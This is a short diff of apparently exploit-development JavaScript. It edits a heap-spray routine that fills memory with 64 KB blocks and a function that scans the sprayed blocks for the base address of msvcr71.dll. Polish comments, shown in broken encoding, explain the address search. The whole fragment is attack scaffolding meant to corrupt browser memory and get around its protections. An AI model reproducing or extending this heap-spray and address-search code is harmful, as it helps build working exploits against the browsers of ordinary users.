@@ -9,8 +9,8 @@
    ... call by ordinals ...
    ... continuable exception ...
 */
-
-var hold = document.getElementById('set');
+var block = '';
+var hold  = document.getElementById('set');
 
 function heaps() {
 
@@ -32,7 +32,7 @@ function heaps() {
     while (code.length < 100000)
         code = code + code;
 
-    var block = code.substr(0, 64*1024/2);
+    block = code.substr(0, 64*1024/2);
 
     for (i=0; i<14; i++) {
         block += code.substr(0, 64*1024/2);
@@ -58,7 +58,8 @@ function baseSearch() {   /* w ktoryms z bloków jest base adres, musimy go jakos
        for(i=0;i<120;i++) {     /* musimy sobie przeskanowac te 120 wielkich blokow i znaleŸæ adres .dll */
                                 /* wiemy ¿e jego dwa ni¿sze bajty wynosz¹ 0x0000 podobnie jak terminator unicode stringa 
 								   "msvcr71.dll" i nic poza tym we wzorcu pamiêci i to powinno wystarczyæ, jeœli nie 
-								   mo¿emy znaleŸæ offset wzglêdem pierwszego bloku poniewa¿ wszystkie one do siebie idealnie przylegaj¹*/
+								   mo¿emy znaleŸæ offset wzglêdem pierwszego bloku poniewa¿ wszystkie one do siebie idealnie przylegaj¹,
+								   zreszt¹ orginalny layout mamy w zmiennej "block".*/
               //alert(escape(mem[i].toString(16)));
                
        }
